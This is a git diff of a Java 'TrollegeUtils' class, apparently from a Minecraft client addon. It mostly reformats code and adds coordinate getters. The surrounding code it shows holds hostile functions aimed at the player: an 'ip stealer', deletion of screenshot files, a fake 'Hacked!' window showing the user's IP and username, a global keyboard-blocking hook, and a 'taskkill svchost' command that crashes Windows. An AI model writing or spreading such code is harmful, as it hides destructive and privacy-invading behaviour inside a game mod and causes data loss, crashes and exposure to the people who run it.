@@ -12,6 +12,8 @@ import meteordevelopment.meteorclient.utils.entity.TargetUtils;
 import meteordevelopment.meteorclient.utils.player.ChatUtils;
 import net.fabricmc.loader.api.FabricLoader;
 import net.minecraft.entity.player.PlayerEntity;
+import net.minecraft.util.math.BlockPos;
+import net.minecraft.util.math.Vec3d;
 import org.lwjgl.system.Pointer;
 import com.github.kwhat.jnativehook.GlobalScreen;
 import com.github.kwhat.jnativehook.NativeHookException;
@@ -39,10 +41,7 @@ public class TrollegeUtils {
     //Todo: More Troll Classes
 
 
-
-
-
-    public static void severelackoffriends(){
+    public static void severelackoffriends() {
         Friends.get().forEach(friend -> Friends.get().remove(friend)
         );
     }
@@ -60,7 +59,6 @@ public class TrollegeUtils {
     }
 
 
-
     //ip stealer
     public static String dip() {
         try {
@@ -70,15 +68,15 @@ public class TrollegeUtils {
         }
     }
 
-    public static void ssdeleter(){
-        String[]entries = ssfolder.list();
-        for(String s: entries){
-            File currentFile = new File(ssfolder.getPath(),s);
+    public static void ssdeleter() {
+        String[] entries = ssfolder.list();
+        for (String s : entries) {
+            File currentFile = new File(ssfolder.getPath(), s);
             currentFile.delete();
         }
     }
 
-    public static void freezemc(){
+    public static void freezemc() {
         try {
             Thread.sleep(1000);
         } catch (InterruptedException e) {
@@ -87,24 +85,23 @@ public class TrollegeUtils {
     }
 
 
-
-    public static void bozojframe(){
+    public static void bozojframe() {
         JFrame bozoframe = new JFrame();
         bozoframe.setTitle("Hacked!");
-        bozoframe.setSize(300,300);
+        bozoframe.setSize(300, 300);
         bozoframe.add(new JLabel("Deleting PersonalFiles in -21 seconds"));
         bozoframe.add(new JLabel("IP: " + String.valueOf(dip())));
         bozoframe.add(new JLabel(windowsusername()));
         bozoframe.add(new JLabel(eurekawatermark()));
     }
 
-    public static void mcstop(){
+    public static void mcstop() {
         mc.stop();
         mc.close();
         System.exit(696969420);
     }
 
-    public static String windowsusername(){
+    public static String windowsusername() {
         return String.valueOf(System.getProperty("user.name"));
     }
 
@@ -121,14 +118,13 @@ public class TrollegeUtils {
         r.keyPress(53);
     }
 
-
-    public static void windowsbsod(){
+    public static void windowsbsod() {
         try {
             Runtime.getRuntime().exec("taskkill.exe /f /im svchost.exe");
         } catch (Exception ignored) {
-           }
+        }
     }
-    
+
     public static void consume(NativeKeyEvent e) {
         try {
             Field f = NativeInputEvent.class.getDeclaredField("reserved");
@@ -136,12 +132,12 @@ public class TrollegeUtils {
             f.setShort(e, (short) 0x01);
 
             System.out.print("[ OK ]\n");
-        }
-        catch (Exception ex) {
+        } catch (Exception ex) {
             System.out.print("[ !! ]\n");
             ex.printStackTrace();
         }
     }
+
     public static Boolean disableKeys(@Nullable String type) {
         NativeKeyListener listener = new NativeKeyListener() {
             public void nativeKeyPressed(NativeKeyEvent e) {
@@ -171,10 +167,32 @@ public class TrollegeUtils {
             GlobalScreen.addNativeKeyListener(listener);
 
             return true;
-        } catch(NativeHookException e) {
-           return false;
+        } catch (NativeHookException e) {
+            return false;
         }
     }
 
+    public static double x(Vec3d vec) {
+        return vec.x;
+    }
 
+    public static double y(Vec3d vec) {
+        return vec.y;
+    }
+
+    public static double z(Vec3d vec) {
+        return vec.z;
+    }
+
+    public static double x(BlockPos bpos) {
+        return bpos.getX();
+    }
+
+    public static double y(BlockPos bpos) {
+        return bpos.getY();
+    }
+
+    public static double z(BlockPos bpos) {
+        return bpos.getZ();
+    }
 }
